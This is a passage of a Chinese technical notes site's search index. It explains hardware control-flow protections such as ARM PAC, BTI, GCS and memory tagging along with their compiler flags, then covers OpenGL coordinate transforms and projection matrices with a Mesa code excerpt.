<code>-mbranch-protection=gcs</code> \u200b\u6765\u200b\u542f\u7528\u200b GCS\u3002</p> <p>RISC-V Zicfiss \u200b\u6269\u5c55\u200b\u4e5f\u200b\u662f\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u6280\u672f\u200b\u3002</p>"},{"location":"software/cfi.html#_3","title":"\u5730\u5740\u200b\u7b7e\u540d\u200b\u548c\u200b\u9a8c\u8bc1","text":"<p>\u200b\u6b64\u5916\u200b\u8fd8\u6709\u200b\u4e00\u79cd\u200b\u9632\u6b62\u200b\u653b\u51fb\u200b\u7684\u200b\u6280\u672f\u200b\uff0c\u200b\u5c31\u662f\u200b\u5bf9\u200b\u5730\u5740\u200b\u8fdb\u884c\u200b\u7b7e\u540d\u200b\u548c\u200b\u9a8c\u8bc1\u200b\u3002\u200b\u5b83\u200b\u7684\u200b\u601d\u60f3\u200b\u662f\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u60f3\u8981\u200b\u631f\u6301\u200b\u63a7\u5236\u6d41\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u9700\u8981\u200b\u628a\u200b\u6b63\u5e38\u200b\u7684\u200b\u5730\u5740\u200b\u8986\u76d6\u200b\u6389\u200b\uff0c\u200b\u53d8\u6210\u200b\u653b\u51fb\u8005\u200b\u63a7\u5236\u200b\u7684\u200b\u5730\u5740\u200b\u3002\u200b\u5982\u679c\u200b\u5904\u7406\u5668\u200b\u80fd\u591f\u200b\u533a\u5206\u200b\u6b63\u5e38\u200b\u7684\u200b\u5730\u5740\u200b\u548c\u200b\u653b\u51fb\u8005\u200b\u6784\u9020\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u9632\u62a4\u200b\u3002\u200b\u5730\u5740\u200b\u7b7e\u540d\u200b\u548c\u200b\u9a8c\u8bc1\u200b\u5c31\u662f\u200b\u8fd9\u6837\u200b\u7684\u200b\u6280\u672f\u200b\uff0c\u200b\u5b83\u200b\u4f7f\u7528\u200b\u7b7e\u540d\u200b\u548c\u200b\u9a8c\u8bc1\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u4f7f\u7528\u200b\u5904\u7406\u5668\u200b\u5185\u90e8\u200b\u7684\u200b\u5bc6\u94a5\u200b\uff0c\u200b\u5bf9\u200b\u6b63\u5e38\u200b\u5730\u5740\u200b\u8fdb\u884c\u200b\u7b7e\u540d\u200b\uff0c\u200b\u7b7e\u540d\u4f1a\u200b\u653e\u5728\u200b\u5730\u5740\u200b\u9ad8\u4f4d\u200b\u4e0a\u200b\uff1a\u200b\u7531\u4e8e\u200b\u76ee\u524d\u200b\u865a\u62df\u5730\u5740\u200b\u7a7a\u95f4\u200b\u6ca1\u6709\u7528\u5b8c\u200b\uff0c\u200b\u6240\u4ee5\u200b\u9ad8\u4f4d\u200b\u5730\u5740\u200b\u53ef\u4ee5\u200b\u7528\u6765\u200b\u5b58\u50a8\u200b\u7b7e\u540d\u200b\u7684\u200b\u4fe1\u606f\u200b\u3002\u200b\u90a3\u4e48\u200b\u4f7f\u7528\u200b\u5730\u5740\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u53bb\u200b\u9a8c\u8bc1\u200b\u8fd9\u4e2a\u200b\u5730\u5740\u200b\u662f\u5426\u662f\u200b\u5408\u6cd5\u200b\u7684\u200b\uff0c\u200b\u7531\u200b\u786c\u4ef6\u200b\u751f\u6210\u200b\u7684\u200b\u3002\u200b\u653b\u51fb\u8005\u200b\u4e0d\u200b\u77e5\u9053\u200b\u5904\u7406\u5668\u200b\u5185\u90e8\u200b\u7684\u200b\u5bc6\u94a5\u200b\uff0c\u200b\u60f3\u8981\u200b\u7be1\u6539\u200b\u5730\u5740\u200b\u65f6\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u7ed9\u51fa\u200b\u6b63\u786e\u200b\u7684\u200b\u7b7e\u540d\u200b\uff0c\u200b\u4e8e\u662f\u200b\u65e0\u6cd5\u200b\u901a\u8fc7\u200b\u68c0\u9a8c\u200b\u3002</p> <p>ARM PAC(Pointer Authentication Code) \u200b\u5c31\u662f\u200b\u8fd9\u6837\u200b\u7684\u200b\u6280\u672f\u200b\u3002\u200b\u7f16\u8bd1\u200b\u65f6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b <code>-mbranch-protection=pac-ret</code> \u200b\u6765\u200b\u542f\u7528\u200b PAC\uff0c\u200b\u6216\u8005\u200b\u8fdb\u4e00\u6b65\u200b\u7528\u200b <code>-mbranch-protection=standard</code> \u200b\u6765\u200b\u540c\u65f6\u200b\u4f7f\u7528\u200b BTI \u200b\u548c\u200b PAC \u200b\u4e24\u4e2a\u200b\u4fdd\u62a4\u200b\u673a\u5236\u200b\u3002\u200b\u53ef\u4ee5\u200b\u7528\u200b <code>readelf -n $BINARY</code> \u200b\u6765\u200b\u67e5\u770b\u200b\u5b83\u200b\u662f\u5426\u200b\u542f\u7528\u200b\u4e86\u200b\u8fd9\u4e9b\u200b\u4fdd\u62a4\u200b\u673a\u5236\u200b\uff1a<code>Properties: AArch64 feature: BTI, PAC</code>\u3002</p> <p>\u200b\u9664\u4e86\u200b\u7b7e\u540d\u200b\u548c\u200b\u8ba4\u8bc1\u200b\u4ee5\u5916\u200b\uff0c\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b\u5f88\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u6280\u672f\u200b\uff0c\u200b\u4f46\u200b\u5b83\u200b\u4e3b\u8981\u200b\u4e0d\u662f\u200b\u7528\u4e8e\u200b\u5b89\u5168\u200b\uff0c\u200b\u800c\u662f\u200b\u7528\u4e8e\u200b\u68c0\u6d4b\u200b\u5185\u5b58\u200b\u8bbf\u95ee\u200b\u6ea2\u51fa\u200b\uff1aMemory Tagging\u3002\u200b\u5b83\u200b\u4e5f\u200b\u662f\u200b\u5728\u200b\u5730\u5740\u200b\u9ad8\u4f4d\u200b\u6dfb\u52a0\u200b\u4e00\u4e9b\u200b\u4fe1\u606f\u200b\uff0c\u200b\u53bb\u200b\u6807\u8bc6\u200b\u8fd9\u4e2a\u200b\u6307\u9488\u200b\u5e94\u8be5\u200b\u8303\u56f4\u200b\u7684\u200b\u5185\u5b58\u200b\u8303\u56f4\u200b\uff0c\u200b\u4f46\u662f\u200b\u8fd9\u4e2a\u200b\u4fe1\u606f\u200b\u6ca1\u6709\u200b\u5bc6\u7801\u5b66\u200b\u7684\u200b\u4fdd\u62a4\u200b\uff0c\u200b\u5141\u8bb8\u200b\u7be1\u6539\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u6280\u672f\u200b\u4e3b\u8981\u200b\u662f\u200b\u7528\u6765\u200b\u52a0\u901f\u200b Address Sanitizer \u200b\u4e00\u7c7b\u200b\u7684\u200b\u6280\u672f\u200b\uff0c\u200b\u7ed9\u200b\u5730\u5740\u200b\u548c\u200b\u5185\u5b58\u200b\u4e0a\u200b\u8272\u200b\uff0c\u200b\u53ea\u6709\u200b\u989c\u8272\u200b\u76f8\u540c\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u624d\u200b\u5141\u8bb8\u200b\u8bbf\u95ee\u200b\u3002\u200b\u4e0d\u8fc7\u200b\u7531\u4e8e\u200b\u989c\u8272\u200b\u6570\u91cf\u200b\u6709\u9650\u200b\uff0c\u200b\u5b83\u200b\u662f\u200b\u53ef\u80fd\u200b\u6f0f\u6389\u200b\u4e00\u4e9b\u200b\u9519\u8bef\u200b\u7684\u200b\u8bbf\u95ee\u200b\u7684\u200b\u3002\u200b\u5728\u200b\u6ca1\u6709\u200b Memory Tagging \u200b\u4e4b\u524d\u200b\uff0cAddress Sanitizer \u200b\u4e3a\u4e86\u200b\u68c0\u67e5\u200b\u6bcf\u6b21\u200b\u8bbf\u5b58\u200b\u662f\u5426\u200b\u8d8a\u754c\u200b\uff0c\u200b\u5f00\u9500\u200b\u4f1a\u200b\u6bd4\u8f83\u200b\u5927\u200b\u3002</p> <p>\u200b\u65e0\u8bba\u662f\u200b PAC \u200b\u8fd8\u662f\u200b Memory Tagging\uff0c\u200b\u90fd\u200b\u9700\u8981\u200b\u786c\u4ef6\u200b\u5728\u200b\u8bbf\u5b58\u200b\u65f6\u200b\uff0c\u200b\u5ffd\u7565\u200b\u5730\u5740\u200b\u7684\u200b\u9ad8\u4f4d\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u7279\u6027\u200b\u4e00\u822c\u200b\u53eb\u200b Top Byte Ignore \u200b\u6216\u8005\u200b Linear Address Masking\u3002\u200b\u8fd9\u4e9b\u200b\u591a\u200b\u51fa\u6765\u200b\u7684\u200b\u4f4d\u6570\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f52\u200b\u8f6f\u4ef6\u200b\u6765\u200b\u81ea\u7531\u53d1\u6325\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u542f\u7528\u200b PAC \u200b\u6216\u200b Memory Tagging \u200b\u6765\u200b\u8ba9\u200b\u786c\u4ef6\u200b\u53c2\u4e0e\u200b\u4f7f\u7528\u200b\u3002</p> <p>\u200b\u7f16\u8bd1\u200b\u65f6\u200b\uff0c\u200b\u7528\u200b <code>-fsanitize=address</code> \u200b\u542f\u7528\u200b Address Sanitizer\uff0c\u200b\u7528\u200b <code>-fsanitize=hwaddress</code> \u200b\u542f\u7528\u200b\u57fa\u4e8e\u200b\u5730\u5740\u200b\u9ad8\u4f4d\u200b\u88ab\u200b\u5ffd\u7565\u200b\u7684\u200b Hardware Address Sanitizer\u3002\u200b\u57fa\u4e8e\u200b Memory Tagging \u200b\u7684\u200b Memory Tagging Sanitizer \u200b\u53ef\u4ee5\u200b\u7528\u200b <code>-fsanitize=memtag</code> \u200b\u5f00\u542f\u200b\uff0c\u200b\u4f46\u200b\u76ee\u524d\u200b\u652f\u6301\u200b\u7684\u200b\u5e73\u53f0\u200b\u8fd8\u200b\u5f88\u5c11\u200b\u3002</p>"},{"location":"software/cg.html","title":"\u8ba1\u7b97\u673a\u200b\u56fe\u5f62\u5b66","text":"<p>\u200b\u672c\u6587\u200b\u53c2\u8003\u200b\u4e86\u200b\u5982\u4e0b\u200b\u7f51\u7ad9\u200b\uff1a</p> <ul> <li>OpenGL Projection Matrix - Song Ho Ahn</li> <li>glOrtho</li> <li>gluPerspective</li> <li>Projection matrices</li> </ul>"},{"location":"software/cg.html#_2","title":"\u9f50\u6b21\u200b\u5750\u6807","text":"<p>\u200b\u9f50\u6b21\u200b\u5750\u6807\u200b\u662f\u200b\u5728\u200b 3 \u200b\u7ef4\u200b\u7684\u200b\u5750\u6807\u200b \\((x, y, z)\\) \u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u6dfb\u52a0\u200b\u4e00\u7ef4\u200b\uff0c\u200b\u53d8\u6210\u200b \\((x, y, z, w)\\)\uff0c\u200b\u5bf9\u5e94\u200b 3 \u200b\u7ef4\u200b\u7684\u200b \\((x/w, y/w, z/w)\\)\uff0c\u200b\u8fd9\u6837\u200b\u505a\u200b\u53ef\u4ee5\u200b\u65b9\u4fbf\u200b\u4e00\u4e9b\u200b\u8ba1\u7b97\u200b\u3002</p> <p>\u200b\u56e0\u6b64\u200b\u4ece\u200b 3 \u200b\u7ef4\u200b\u5750\u6807\u200b\u8f6c\u6362\u200b\u4e3a\u200b\u9f50\u6b21\u200b\u5750\u6807\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6dfb\u52a0\u200b\u4e00\u7ef4\u200b \\(w = 1\\)\uff0c\u200b\u53d8\u6210\u200b \\((x, y, z, 1)\\)\u3002\u200b\u4e3a\u4e86\u200b\u8ba9\u200b 3 \u200b\u7ef4\u200b\u7684\u200b\u5411\u91cf\u200b\u548c\u200b\u70b9\u200b\u5728\u200b\u9f50\u6b21\u200b\u5750\u6807\u200b\u4e0b\u200b\u53ef\u4ee5\u200b\u8fdb\u884c\u200b\u8fd0\u7b97\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5411\u200b 3 \u200b\u7ef4\u200b\u5411\u91cf\u200b\u6dfb\u52a0\u200b\u4e00\u7ef4\u200b \\(w=0\\)\uff0c\u200b\u6b64\u65f6\u200b \\(w=0\\) \u200b\u8868\u793a\u200b\u5411\u91cf\u200b\uff0c\\(w \\ne 0\\) \u200b\u8868\u793a\u200b\u70b9\u200b\u3002</p>"},{"location":"software/cg.html#_3","title":"\u5750\u6807\u200b\u53d8\u6362","text":"<p>OpenGL \u200b\u4e2d\u200b\u5750\u6807\u200b\u53d8\u6362\u200b\u7ecf\u8fc7\u200b\u4e86\u200b\u5982\u4e0b\u200b\u7684\u200b\u6b65\u9aa4\u200b\uff1a</p> <ol> <li>\u200b\u7269\u4f53\u200b\u5750\u6807\u200b\uff0c4D \u200b\u9f50\u6b21\u200b\u5750\u6807\u200b</li> <li>\u200b\u4e58\u4ee5\u200b Model \u200b\u548c\u200b View \u200b\u77e9\u9635\u200b\uff0c\u200b\u5f97\u5230\u200b 4D \u200b\u9f50\u6b21\u200b\u5750\u6807\u200b</li> <li>\u200b\u4e58\u4ee5\u200b Projection \u200b\u77e9\u9635\u200b\uff0c\u200b\u5f97\u5230\u200b 4D \u200b\u9f50\u6b21\u200b\u5750\u6807\u200b</li> <li>\u200b\u628a\u200b\u9f50\u6b21\u200b\u5750\u6807\u200b\u8f6c\u6362\u200b\u4e3a\u200b\u5bf9\u5e94\u200b\u7684\u200b 3D \u200b\u5750\u6807\u200b\uff0c\u200b\u4e3a\u200b Normalized Device Coordinates</li> <li>\u200b\u628a\u200b 3D \u200b\u5750\u6807\u200b\u5bf9\u5e94\u200b\u5230\u200b\u5c4f\u5e55\u200b\u4e0a\u200b\u7684\u200b 2D \u200b\u5750\u6807\u200b</li> </ol> <p>\u200b\u53c2\u8003\u200b\uff1aOpenGL Transformation</p>"},{"location":"software/cg.html#normalized-device-coordinates","title":"Normalized Device Coordinates","text":"<p>NDC\uff08Normalized Device Coordinates\uff09\u200b\u662f\u200b\u7ecf\u8fc7\u200b\u4e00\u7cfb\u5217\u200b\u53d8\u6362\u200b\u4ee5\u540e\u200b\uff0c\u200b\u5f97\u5230\u200b\u7684\u200b\u6700\u7ec8\u200b\u7684\u200b 3D \u200b\u5750\u6807\u200b\u3002</p> <p>\u200b\u4ee5\u200b OpenGL \u200b\u4e3a\u4f8b\u200b\uff0cNDC \u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u5728\u200b\u4e09\u4e2a\u200b\u5750\u6807\u8f74\u200b\u4e0a\u200b\u90fd\u200b\u5728\u200b \\([-1, 1]\\) \u200b\u4e4b\u95f4\u200b\u7684\u200b\u7acb\u65b9\u4f53\u200b\uff0c\u200b\u53ea\u6709\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u7acb\u65b9\u4f53\u200b\u4e2d\u200b\u7684\u200b\u7269\u4f53\u200b\u624d\u200b\u53ef\u80fd\u200b\u88ab\u200b\u663e\u793a\u200b\u51fa\u6765\u200b\u3002</p> <p>NDC \u200b\u7684\u200b\u5750\u6807\u200b\u8303\u56f4\u200b\u5728\u200b\u4e0d\u540c\u200b\u7684\u200b\u56fe\u5f62\u200b API \u200b\u4e0b\u200b\u53ef\u80fd\u200b\u4e0d\u200b\u4e00\u6837\u200b\uff0c\u200b\u4f8b\u5982\u200b OpenGL \u200b\u548c\u200b WebGL \u200b\u662f\u4ece\u200b \\((-1, -1, -1)\\) \u200b\u5230\u200b \\((1, 1, 1)\\)\uff0c\u200b\u800c\u200b DirectX-12\u3001Metal\u3001Vulkan \u200b\u548c\u200b WebGPU \u200b\u662f\u4ece\u200b \\((-1, -1, 0)\\) \u200b\u5230\u200b \\((1, 1, 1)\\)\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b Z \u200b\u8f74\u4e0a\u200b\u7684\u200b\u8303\u56f4\u200b\u53ea\u6709\u200b \\([0, 1]\\)\u3002</p> <p>\u200b\u6700\u540e\u200b\u663e\u793a\u200b\u5728\u200b\u5c4f\u5e55\u200b\u4e0a\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u663e\u793a\u200b\u533a\u57df\u200b\u7684\u200b\u5de6\u4e0b\u89d2\u200b\u5c31\u200b\u5bf9\u5e94\u200b \\(x=-1, y=-1\\)\uff0c\u200b\u53f3\u4e0a\u89d2\u200b\u5bf9\u5e94\u200b \\(x=1, y=1\\)\uff08\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u662f\u200b\u5de6\u4e0a\u89d2\u200b \\(x=-1, y=-1\\)\uff0c\u200b\u53f3\u4e0b\u89d2\u200b \\(x=1, y=1\\)\uff0c\u200b\u4e0d\u540c\u200b\u7684\u200b\u56fe\u5f62\u200b API \u200b\u89c4\u5b9a\u200b\u4e0d\u540c\u200b\uff09\u3002\\(z\\) \u200b\u8f74\u200b\u5bf9\u5e94\u200b\u6df1\u5ea6\u200b\uff0c\u200b\u663e\u793a\u200b\u5728\u200b\u524d\u9762\u200b\u7684\u200b\uff08\\(z\\) \u200b\u8f83\u200b\u5c0f\u200b\u7684\u200b\uff09\u200b\u4f1a\u200b\u906e\u6321\u200b\u663e\u793a\u200b\u5728\u200b\u540e\u9762\u200b\u7684\u200b\uff08\\(z\\) \u200b\u8f83\u5927\u200b\u7684\u200b\uff09\u3002</p> <p>\u200b\u56e0\u6b64\u200b NDC \u200b\u5230\u200b\u5c4f\u5e55\u200b\u5750\u6807\u200b\u7684\u200b\u5bf9\u5e94\u200b\u5173\u7cfb\u200b\u662f\u200b\uff1a</p> <ol> <li>x \u200b\u8f74\u200b\uff1a-1 -&gt; x, 1 -&gt; x + w</li> <li>y \u200b\u8f74\u200b\uff1a-1 -&gt; y, 1 -&gt; y + w</li> <li>z \u200b\u8f74\u200b\uff1a-1 -&gt; n, 1 -&gt; f</li> </ol> <p>\u200b\u5176\u4e2d\u200b x, y, w \u200b\u548c\u200b h \u200b\u7528\u200b glViewport \u200b\u51fd\u6570\u200b\u8bbe\u7f6e\u200b\uff0cn \u200b\u548c\u200b f \u200b\u7528\u200b glDepthRange \u200b\u8bbe\u7f6e\u200b\u3002</p>"},{"location":"software/cg.html#_4","title":"\u6b63\u4ea4\u6295\u5f71","text":"<p>\u200b\u6b63\u4ea4\u6295\u5f71\u200b\u8981\u200b\u505a\u200b\u7684\u200b\u662f\u200b\u628a\u200b\u4e00\u4e2a\u200b\u957f\u65b9\u4f53\u200b\u7ebf\u6027\u200b\u6620\u5c04\u200b\u5230\u200b NDC \u200b\u4e2d\u200b\uff0c\u200b\u4ee5\u200b OpenGL \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u8981\u200b\u6620\u5c04\u200b\u5230\u200b\u4e09\u4e2a\u200b\u7ef4\u5ea6\u200b\u4e0a\u200b\u90fd\u200b\u662f\u200b \\([-1, 1]\\) \u200b\u4e4b\u95f4\u200b\u7684\u200b\u7acb\u65b9\u4f53\u200b\u3002</p> <p>\u200b\u8fd9\u4e2a\u200b\u957f\u65b9\u4f53\u200b\u7684\u200b\u8fb9\u200b\u548c\u200b\u5750\u6807\u8f74\u200b\u5e73\u884c\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u7528\u200b\u4ee5\u4e0b\u200b\u51e0\u4e2a\u200b\u53d8\u91cf\u200b\u6765\u200b\u5b9a\u4e49\u200b\u957f\u65b9\u4f53\u200b\u7684\u200b\u5750\u6807\u200b\uff1a</p> <ol> <li>left, right, top, bottom\uff1a\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u957f\u65b9\u4f53\u200b\u4e0a\u200b\u5e73\u884c\u200b\u4e8e\u200b X-Y \u200b\u5c4f\u5e55\u200b\u7684\u200b\u9762\u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u5176\u4e2d\u200b left \u200b\u548c\u200b right \u200b\u5c31\u662f\u200b X \u200b\u8f74\u4e0a\u200b\u7684\u200b\u6700\u5c0f\u503c\u200b\u548c\u200b\u6700\u5927\u503c\u200b\uff0cbottom \u200b\u548c\u200b top \u200b\u5c31\u662f\u200b Y \u200b\u8f74\u4e0a\u200b\u7684\u200b\u6700\u5c0f\u503c\u200b\u548c\u200b\u6700\u5927\u503c\u200b</li> <li>near\uff0cfar\uff1a\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u957f\u65b9\u4f53\u200b\u5728\u200b Z \u200b\u8f74\u4e0a\u200b\u7684\u200b\u533a\u95f4\u200b\uff0c\u200b\u79bb\u200b\u539f\u70b9\u200b\u6700\u8fd1\u200b\u7684\u200b\u5e73\u9762\u200b\u7684\u200b Z \u200b\u503c\u200b\u662f\u200b <code>-near</code>\uff0c\u200b\u6700\u8fdc\u200b\u7684\u200b\u5e73\u9762\u200b\u7684\u200b Z \u200b\u503c\u200b\u662f\u200b <code>-far</code></li> </ol> <p>\u200b\u4e0b\u9762\u200b\u7528\u200b\u8fd9\u4e9b\u200b\u5750\u6807\u200b\u7684\u200b\u9996\u5b57\u6bcd\u200b\u6765\u200b\u7b80\u79f0\u200b\uff1a\\(l\\) \u200b\u4ee3\u8868\u200b left\uff0c\u200b\u4f9d\u6b64\u7c7b\u63a8\u200b\u3002</p> <p>\u200b\u76ee\u6807\u200b\u662f\u200b\u628a\u200b\u8fd9\u4e2a\u200b\u957f\u65b9\u4f53\u200b\u6620\u5c04\u200b\u5230\u200b \\([-1, 1]\\) \u200b\u7684\u200b\u7acb\u65b9\u4f53\u200b\u4e0a\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u8003\u8651\u200b X \u200b\u8f74\u200b\uff1a\u200b\u8981\u200b\u7ebf\u6027\u200b\u5730\u200b\u628a\u200b \\(x=l\\) \u200b\u6620\u5c04\u200b\u5230\u200b \\(x=-1\\)\uff0c\u200b\u628a\u200b \\(x=r\\) \u200b\u6620\u5c04\u200b\u5230\u200b \\(x=1\\)\uff0c\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b \\(x' = \\frac{2}{r-l}x-\\frac{r+l}{r-l}\\)\u3002</p> <p>\u200b\u540c\u7406\u200b\uff0cY \u200b\u5750\u6807\u200b\u7684\u200b\u8ba1\u7b97\u516c\u5f0f\u200b\u662f\u200b \\(y' = \\frac{2}{t-b}y-\\frac{t+b}{t-b}\\)\u3002</p> <p>Z \u200b\u8f74\u4e0a\u200b\u591a\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u8d1f\u53f7\u200b\uff1a\u200b\u7ebf\u6027\u200b\u5730\u200b\u628a\u200b \\(z=-n\\) \u200b\u6620\u5c04\u200b\u5230\u200b \\(z=-1\\)\uff0c\u200b\u628a\u200b \\(z=-f\\) \u200b\u6620\u5c04\u200b\u5230\u200b \\(z=1\\)\uff0c\u200b\u5f97\u5230\u200b \\(z' = \\frac{-2}{f-n}z-\\frac{f+n}{f-n}\\)\u3002</p> <p>\u200b\u6ce8\u200b\uff1a\u200b\u5982\u679c\u200b NDC \u200b\u7684\u200b Z \u200b\u8f74\u200b\u8303\u56f4\u200b\u662f\u200b \\([0, 1]\\)\uff0c\u200b\u90a3\u4e48\u200b Z \u200b\u8f74\u200b\u7684\u200b\u8ba1\u7b97\u516c\u5f0f\u200b\u5c31\u662f\u200b \\(z' = \\frac{-1}{f-n}z-\\frac{n}{f-n}\\)</p> <p>\u200b\u603b\u7ed3\u200b\u4e00\u4e0b\u200b\u5c31\u662f\u200b\uff1a</p> \\[\\begin{align} x' = \\frac{2}{r-l}x-\\frac{r+l}{r-l} \\\\ y' = \\frac{2}{t-b}y-\\frac{t+b}{t-b} \\\\ z' = \\frac{-2}{f-n}z-\\frac{f+n}{f-n} \\end{align}\\] <p>\u200b\u8003\u8651\u200b\u5230\u200b\u5b9e\u9645\u200b\u91c7\u7528\u200b\u7684\u200b\u662f\u200b\u9f50\u6b21\u200b\u5750\u6807\u7cfb\u200b\uff0c\\(w\\) \u200b\u4e0d\u53d8\u200b\uff0c\u200b\u6240\u4ee5\u200b \\(w' = w\\)\u3002\u200b\u628a\u200b\u4e0a\u9762\u200b\u7684\u200b\u7b49\u5f0f\u200b\u5199\u6210\u200b\u77e9\u9635\u200b\u7684\u200b\u5f62\u5f0f\u200b\uff0c\u200b\u5c31\u662f\u200b\uff1a</p> \\[ \\begin{pmatrix} \\frac{2}{r-l} &amp; 0 &amp; 0 &amp; -\\frac{r+l}{r-l} \\\\ 0 &amp; \\frac{2}{t-b} &amp; 0 &amp; -\\frac{t+b}{t-b} \\\\ 0 &amp; 0 &amp; \\frac{-2}{f-n} &amp; -\\frac{f+n}{f-n} \\\\ 0 &amp; 0 &amp; 0 &amp; 1 \\end{pmatrix} \\] <p>\u200b\u8fd9\u200b\u6b63\u662f\u200b OpenGL \u200b\u6b63\u4ea4\u6295\u5f71\u200b\u51fd\u6570\u200b glOrtho() \u200b\u6240\u200b\u8ba1\u7b97\u200b\u7684\u200b\u77e9\u9635\u200b\uff1a</p> <p> </p> \u200b\u6b63\u4ea4\u6295\u5f71\u200b\u77e9\u9635\u200b\uff08\u200b\u56fe\u6e90\u200b glOrtho\uff09 <p>mesa \u200b\u4e2d\u200b\u7684\u200b\u5b9e\u73b0\u200b\uff1a</p> <pre><code>// Source: https://github.com/Mesa3D/mesa/blob/957009978ef6d7121fc0d710d03bc20097d4d46b/src/mesa/math/m_matrix.c#L813C1-L840\nvoid\n_math_float_ortho(float *m,\n                  float left, float right,\n                  float bottom, float top,\n                  float nearval, float farval)\n{\n#define M(row,col)  m[col*4+row]\n   M(0,0) = 2.0F / (right-left);\n   M(0,1) = 0.0F;\n   M(0,2) = 0.0F;\n   M(0,3) = -(right+left) / (right-left);\n\n   M(1,0) = 0.0F;\n   M(1,1) = 2.0F / (top-bottom);\n   M(1,2) = 0.0F;\n   M(1,3) = -(top+bottom) / (top-bottom);\n\n   M(2,0) = 0.0F;\n   M(2,1) = 0.0F;\n   M(2,2) = -2.0F / (farval-nearval);\n   M(2,3) = -(farval+nearval) / (farval-nearval);\n\n   M(3,0) = 0.0F;\n   M(3,1) = 0.0F;\n   M(3,2) = 0.0F;\n   M(3,3) = 1.0F;\n#undef M\n}\n</code></pre>"},{"location":"software/cg.html#_5","title":"\u900f\u89c6\u200b\u6295\u5f71","text":"<p>\u200b\u900f\u89c6\u200b\u6295\u5f71\u200b\u8981\u200b\u505a\u200b\u7684\u200b\u662f\u200b\u628a\u200b\u4e00\u4e2a\u200b\u56db\u200b\u68f1\u53f0\u200b\uff08Square Frustum\uff0c\u200b\u56db\u200b\u68f1\u9525\u200b\u6c34\u5e73\u200b\u5207\u5f00\u200b\uff0c\u200b\u5e95\u9762\u200b\u548c\u200b\u9876\u9762\u200b\u662f\u200b\u6b63\u65b9\u5f62\u200b\uff0c\u200b\u5176\u4f59\u200b\u56db\u4e2a\u200b\u9762\u90fd\u200b\u662f\u200b\u68af\u5f62\u200b\uff09\u200b\u6620\u5c04\u200b\u5230\u200b NDC \u200b\u4e0a\u200b\u3002\u200b\u5176\u4e2d\u200b\u56db\u200b\u68f1\u53f0\u200b\u7684\u200b\u56db\u6761\u200b\u68f1\u200b\u5ef6\u957f\u200b\u4ee5\u540e\u200b\uff0c\u200b\u4ea4\u200b\u4e8e\u200b\u539f\u70b9\u200b\u3002\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\u7126\u70b9\u200b\u5c31\u662f\u200b\u5750\u6807\u8f74\u200b\u7684\u200b\u539f\u70b9\u200b\u3002</p> <p>\u200b\u76f8\u6bd4\u200b\u6b63\u4ea4\u6295\u5f71\u200b\uff0c\u200b\u900f\u89c6\u200b\u6295\u5f71\u200b\u6700\u5927\u200b\u7684\u200b\u4e0d\u540c\u200b\u5728\u4e8e\u200b\u5b83\u200b\u8fd1\u5927\u8fdc\u200b\u5c0f\u200b\u7684\u200b\u7279\u6027\u200b\uff0c\u200b\u66f4\u52a0\u200b\u8d34\u8fd1\u200b\u5b9e\u9645\u200b\uff1a\u200b\u6b63\u4ea4\u6295\u5f71\u200b\u65e0\u8bba\u200b\u6df1\u5ea6\u200b\u591a\u5c11\u200b\uff0c\u200b\u770b\u5230\u200b\u7684\u200b\u7269\u4f53\u200b\u5927\u5c0f\u200b\u4e0d\u53d8\u200b\uff1b\u200b\u800c\u200b\u5728\u200b\u900f\u89c6\u200b\u6295\u5f71\u200b\u4e2d\u200b\uff0c\u200b\u4ece\u200b\u539f\u70b9\u200b\u51fa\u53d1\u200b\uff0c\u200b\u5230\u200b near \u200b\u5e73\u9762\u200b\u4e0a\u200b\u7684\u200b\u4e00\u70b9\u200b\u8fde\u6210\u200b\u5c04\u7ebf\u200b\uff0c\u200b\u8fd9\u200b\u6761\u200b\u5c04\u7ebf\u200b\u4e0a\u200b\u7684\u200b\u70b9\u200b\u90fd\u200b\u5bf9\u5e94\u200b\u540c\u4e00\u4e2a\u200b\u5c4f\u5e55\u200b\u4e0a\u200b\u7684\u200b\u70b9\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8fdc\u200b\u7684\u200b\u7269\u4f53\u200b\u5728\u200b\u5c4f\u5e55\u200b\u4e0a\u200b\u770b\u200b\u7684\u200b\u5c0f\u200b\uff0c\u200b\u8fd1\u200b\u7684\u200b\u7269\u4f53\u200b\u5728\u200b\u5c4f\u5e55\u200b\u4e0a\u200b\u770b\u200b\u5f97\u200b\u5927\u200b\u3002</p> 